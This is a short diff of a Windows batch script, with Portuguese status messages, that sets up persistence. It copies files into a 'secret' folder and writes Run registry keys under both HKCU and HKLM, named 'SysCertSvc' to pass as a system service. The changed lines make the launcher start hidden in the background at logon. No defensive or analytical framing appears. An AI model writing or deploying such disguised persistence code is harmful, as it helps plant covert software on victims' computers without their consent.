@@ -99,8 +99,8 @@ copy /Y "%~dp0\%regFile%" "%secretPath%\" >nul
 echo [SUCESSO] Arquivos copiados.
 echo.
 echo [ACAO]   Configurando persistencia no registro...
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysCertSvc" /t REG_SZ /d "\"%secretPath%\%launcherFile%\"" /f >nul
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysCertSvc" /t REG_SZ /d "\"%secretPath%\%launcherFile%\"" /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysCertSvc" /t REG_SZ /d "cmd /c start \"\" /B \"%secretPath%\\%launcherFile%\"" /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysCertSvc" /t REG_SZ /d "cmd /c start \"\" /B \"%secretPath%\\%launcherFile%\"" /f >nul
 
 if %errorlevel% equ 0 (
     echo [SUCESSO] Persistencia configurada.
